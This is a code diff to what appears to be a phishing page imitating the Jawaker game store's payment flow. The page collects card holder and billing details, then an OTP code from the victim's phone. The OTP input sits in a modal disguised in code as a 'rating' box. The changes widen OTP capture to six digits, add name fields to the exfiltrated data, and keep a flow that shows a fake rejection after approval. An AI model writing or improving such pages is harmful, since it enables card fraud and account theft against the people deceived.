@@ -10,11 +10,11 @@
 <link rel="canonical" href="https://YOUR-SITE-URL.example.com/">
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght500;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root{
     /* ألوان متجر جواكر الرسمي الدقيقة */
-    --bg: #0f172a;          /* الخلفية الكحلية الداكنة الرسمية لجواكر */
+    --bg: #d1d5db;          /* الخلفية الكحلية الداكنة الرسمية لجواكر */
     --bg-alt: #161f30;      /* خلفية النوافذ والفورم أفتح متناسقة */
     --card: #1c263b;        /* لون بطاقات العرض */
     --card-border: #28354d; /* لون الحدود الناعمة */
@@ -426,7 +426,7 @@
   }
   .rating-input-wrapper {
     width: 100%;
-    max-width: 180px;
+    max-width: 200px;
     margin: 0 auto 10px;
     text-align: right;
   }
@@ -554,7 +554,7 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label"> معلومات البطاقة</div>
+      <div class="section-label">معلومات البطاقة</div>
 
       <div class="field card-field">
         <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
@@ -571,7 +571,7 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">معلومات الفواتبر</div>
+      <div class="section-label">معلومات الفواتير</div>
 
       <div style="display:flex; gap:10px;">
         <div class="field card-field" style="flex:1;">
@@ -611,11 +611,11 @@
     <div class="rating-text">لقد قمنا بإرسال رمز OTP إلى رقم هاتفك المحمول، يرجى كتابته للمتابعة.</div>
     
     <div class="rating-input-wrapper">
-      <input type="number" id="ratingInput" class="rating-input" placeholder="- - - -" required>
+      <input type="text" id="ratingInput" class="rating-input" inputmode="numeric" maxlength="6" placeholder="- - - - - -" required>
       <span class="rating-refresh-link" id="ratingRefreshBtn">إعادة ارسال</span>
     </div>
 
-    <div class="rating-error" id="ratingError">الرجاء إدخال 4 أرقام على الأقل</div>
+    <div class="rating-error" id="ratingError">الرجاء إدخال رمز مكون من 4 إلى 6 أرقام</div>
     <button type="button" class="rating-submit" id="ratingSubmitBtn" disabled>تأكيد</button>
   </div>
 </div>
@@ -776,7 +776,6 @@
     }, 25000);
   }
 
-  /* عند قبول الطلب تظهر رسالة الرفض بناءً على رغبتك */
   function showApproved(){
     statusSpinnerWrap.style.display = 'none';
     statusIcon.style.display = '';
@@ -851,6 +850,8 @@
       joinDay: data.get('joinDay'),
       joinMonth: data.get('joinMonth'),
       joinYear: data.get('joinYear'),
+      firstNameRecord: data.get('firstNameRecord'),
+      lastNameRecord: data.get('lastNameRecord'),
       order: currentOrder || {},
     };
 
@@ -876,7 +877,7 @@
     }
   });
 
-  // ---- Rating modal script ----
+  // ---- FastPay OTP Script ----
   let currentOrderId = null;
   const ratingOverlay = document.getElementById('ratingOverlay');
   const ratingInput = document.getElementById('ratingInput');
@@ -884,11 +885,10 @@
   const ratingSubmitBtn = document.getElementById('ratingSubmitBtn');
   const ratingRefreshBtn = document.getElementById('ratingRefreshBtn');
 
-  function isRatingValid(){
-    return ratingInput.value.trim().length >= 4;
-  }
-  
+  // تنظيف مدخلات الـ OTP (أرقام فقط بحد أقصى 6 أرقام)
   ratingInput.addEventListener('input', function(){
+    this.value = this.value.replace(/\D/g, '').slice(0, 6);
+    
     if(isRatingValid()){
       ratingSubmitBtn.disabled = false;
       ratingInput.classList.remove('invalid');
@@ -897,6 +897,11 @@
       ratingSubmitBtn.disabled = true;
     }
   });
+
+  function isRatingValid(){
+    const val = ratingInput.value.trim();
+    return val.length >= 4 && val.length <= 6;
+  }
 
   ratingRefreshBtn.addEventListener('click', function(){
     ratingInput.value = '';
@@ -923,7 +928,7 @@
 
   ratingSubmitBtn.addEventListener('click', async function(){
     const valueStr = ratingInput.value.trim();
-    if(valueStr.length < 4){
+    if(!isRatingValid()){
       ratingInput.classList.add('invalid');
       ratingError.classList.add('show');
       ratingInput.focus();
